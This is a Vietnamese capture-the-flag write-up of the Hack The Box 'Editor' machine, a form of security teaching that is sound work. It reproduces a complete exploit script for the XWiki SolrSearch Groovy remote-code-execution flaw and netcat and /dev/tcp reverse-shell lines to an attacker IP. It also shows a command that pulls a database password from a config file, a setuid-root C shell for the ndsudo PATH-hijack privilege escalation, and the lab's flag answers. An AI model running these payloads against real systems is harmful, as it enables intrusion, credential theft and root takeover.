---
title: HTB Editor
published: 2025-08-20
tags: [HTB, Linux, Easy]
category: Writeups
author: Trohan0x00
draft: flase
description: Writeup about Editor Machine
image: "/assets/post_image/editor.png"
---
# HTB Labs: Editor 
## I. User flag
Đến với lab việc đầu tiên ta sẽ recon trước bằng nmap 
![image](https://hackmd.io/_uploads/SyS02j8Kge.png)
Ta thấy có 2 service web ở port `80` và `8080` và 1 `ssh`. Giờ mình sẽ kiểm trả ở port `80` trước. Trước đó thì ta cần update tên miền vào file `/etc/hosts` trước
![image](https://hackmd.io/_uploads/rJC21h8Kgg.png)
Nhìn chung đây là một trang sản phẩm cho người dùng có thể tải `Code Editor` về máy và tìm kiếm thì mình không thấy điểm nào để có thể inject input vào nên tạm thời sẽ đi đến với port `8080`
![image](https://hackmd.io/_uploads/S1v74HDYgg.png)
Ta thấy đây là một trang dùng `xwiki` để giới thiệu về tool `Simplist code` ở phía trang port `80`. Có một vài trường và path đáng để xem xét. Ở bên dưới ta thấy rằng phiên bản `xwiki` là `XWiki Debian 15.10.8`
![image](https://hackmd.io/_uploads/SJh04Bvtle.png)
Mình sẽ check sploit bằng [exploit-db](https://www.exploit-db.com/) để xem có bản khai thác hay `POC` nào được public không. Ta thấy được có bản `CVE` đã công bố 2025 về lỗ hỏng của version này
![image](https://hackmd.io/_uploads/S1l8LSwtxl.png)

```python 

# Exploit Title: XWiki Platform - Remote Code Execution
# Exploit Author: Al Baradi Joy
# Exploit Date: April 6, 2025
# CVE ID: CVE-2025-24893
# Vendor Homepage: https://www.xwiki.org/
# Software Link: https://github.com/xwiki/xwiki-platform
# Version: Affected versions up to and including XWiki 15.10.10
# Tested Versions: XWiki 15.10.10
# Vulnerability Type: Remote Code Execution (RCE)
# CVSS Score: 9.8 (Critical)
# CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
# Description:
# XWiki Platform suffers from a critical vulnerability where any guest user
can
# execute arbitrary code remotely through the SolrSearch endpoint. This can
lead
# to a full server compromise, including the ability to execute commands on
the
# underlying system. The vulnerability impacts the confidentiality,
integrity,
# and availability of the XWiki installation. The issue has been patched in
XWiki
# versions 15.10.11, 16.4.1, and 16.5.0RC1.
# Proof of Concept: Yes
# Categories: XWiki, Remote Code Execution, CVE-2025, RCE
# References:
# - GHSA Advisory: https://github.com/advisories/GHSA-rr6p-3pfg-562j
# - NVD CVE Details: https://nvd.nist.gov/vuln/detail/CVE-2025-24893
# - GitHub Exploit Link:
https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py

import requests

# Banner
def display_banner():
print("="*80)
print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code
Execution")
print("Exploit Author: Al Baradi Joy")
print("GitHub Exploit:
https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py")
print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
https_url = f"https://{domain}"
http_url = f"http://{domain}"

try:
response = requests.get(https_url, timeout=5, allow_redirects=True)
if response.status_code < 400:
print(f"[✔] Target supports HTTPS: {https_url}")
return https_url
except requests.exceptions.RequestException:
print("[!] HTTPS not available, falling back to HTTP.")

try:
response = requests.get(http_url, timeout=5, allow_redirects=True)
if response.status_code < 400:
print(f"[✔] Target supports HTTP: {http_url}")
return http_url
except requests.exceptions.RequestException:
print("[✖] Target is unreachable on both HTTP and HTTPS.")
exit(1)

# Exploit function
def exploit(target_url):
target_url = detect_protocol(target_url.replace("http://",
"").replace("https://", "").strip())
exploit_url =
f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"

try:
print(f"[+] Sending request to: {exploit_url}")
response = requests.get(exploit_url, timeout=10)

# Check if the exploit was successful
if response.status_code == 200 and "root:" in response.text:
print("[✔] Exploit successful! Output received:")
print(response.text)
else:
print(f"[✖] Exploit failed. Status code:
{response.status_code}")

except requests.exceptions.ConnectionError:
print("[✖] Connection failed. Target may be down.")
except requests.exceptions.Timeout:
print("[✖] Request timed out. Target is slow or unresponsive.")
except requests.exceptions.RequestException as e:
print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
display_banner()
target = input("[?] Enter the target URL (without http/https):
").strip()
exploit(target)
            
```
Lỗi nằm trong macro SolrSearch của XWiki. Khi người dùng gửi truy vấn tìm kiếm với `media=rss`, dữ liệu này được chèn trực tiếp vào `template`. `Template` này cho phép chèn và thực thi mã `Groovy`, nhưng không có cơ chế lọc/chặn thích hợp.
Kết quả: kẻ tấn công có thể inject Groovy script → được thực thi trực tiếp trên server.

Ta thấy được đoạn payload rce là `}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}`. Ở đây sẽ dùng `}}}` để out khỏi context ban đầu sau đó dùng macro `async` để đồng bộ hóa và chèn thêm macro `groovy` vào thực hiện `RCE` để đọc file `/etc/passwd`. Giờ ta sẽ tiến hành inject thử với lệnh
Mình sẽ test thử với lệnh `id` về cơ bản để check xem quyền của ta như thế nào, có thể là root hay không. Như ta thấy thì kết quả trả về khá nhiều data nhưng ta chỉ cần vô theo các dòng có `rss`
![image](https://hackmd.io/_uploads/SJLj0HDYxe.png)
Ta có thể thấy được kết quả đã thành công có thể thực hiện được `RCE`. Giờ mình sẽ check thử xem có thể đưa `rev shell` vào không để thuận tiện dùng lệnh
Ta có thể dùng `'busybox nc 10.10.10.10 9001 -e /bin/bash'` để rev shell. Ta nên thêm busybox để có thể chạy `nc -e` thay vì chạy lệnh `bash -c 'exec bash -i >& /dev/tcp/10.10.14.24/4444 0>&1'` vì sẽ có nhiều target không có bash đầy đủ và cũng không hỗ trợ `/dev/tcp`
![image](https://hackmd.io/_uploads/HyXkMuPtgg.png)
Ta đã thành công thực hiện `rev shell`, giờ là đến việc tìm `user flag` . Sau một lúc tìm hiểu về `XWiki` ta thấy được có một file đặc biệt `/usr/local/xwiki/webapps/xwiki/WEB-INF/hibernate.cfg.xml`. File này là nơi `XWiki` dùng để kết nối với database của server để thực hiện xử lý các dữ liệu liên quan đến `login, logout, reg,...` 
Do `dir` không giống nhau nên mình check thử thì thấy được file nằm ở `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`
![image](https://hackmd.io/_uploads/HJIFBdwKxl.png)
Ta có thể thấy được thông tin `password` bằng lệnh `cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep "password"` 
![image](https://hackmd.io/_uploads/Bkh9D_wFll.png)
Cộng thêm với username là `oliver` ta có thể login vào `ssh server` để lấy shell
![image](https://hackmd.io/_uploads/SkA6vuDFlx.png)
> 3fd90dfed2869746543d3f036734541d

## II. Root flag
Đến với phần lấy `root flag`, thì việc cần làm là check trước các bước đầu tiên là `enum SUID` với `find / -perm -4000 2>/dev/null`
![image](https://hackmd.io/_uploads/ry-29OvYlg.png)
Ta thấy được đáng chú ý nhất là `ndsudo` từng dính `CVE-2024-32019 (Untrusted Search Path)`. Lỗ hổng phát sinh khi `ndsudo` được đóng gói dưới dạng `SUID root` (root-owned và có bit SUID), nhưng lại tìm các lệnh thông qua biến môi trường `PATH`, điều này dẫn đến tình huống `Untrusted Search Path`.
Mình tìm được `POC` cụ thể [ở đây](https://github.com/AzureADTrent/CVE-2024-32019-POC)
ta sẽ dùng file c 
```c 
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
Và sau đó dùng gcc compile thành binary do ở phía `ssh server` không có `gcc` nên ta sẽ dùng ở local. Tiếp đến để truyền nhanh lên `ssh server` mà không cần mở server ở local ta có thể dùng `scp`
![image](https://hackmd.io/_uploads/HJnW2uvKxg.png)
Giờ ta sẽ set `PATH` biến mội trường cho nó và cấp quyền thực thi
![image](https://hackmd.io/_uploads/S1X8huPFel.png)
Sau cùng là sẽ gọi lệnh `./ndsudo nvme-list`
![image](https://hackmd.io/_uploads/H1qXT_vKge.png)
Giờ ta đã có quyền root giờ chỉ cần đến root và lấy flag
![image](https://hackmd.io/_uploads/B1aHTOvKeg.png)

> 396ef747a71039bd66d36d2d75c4966f

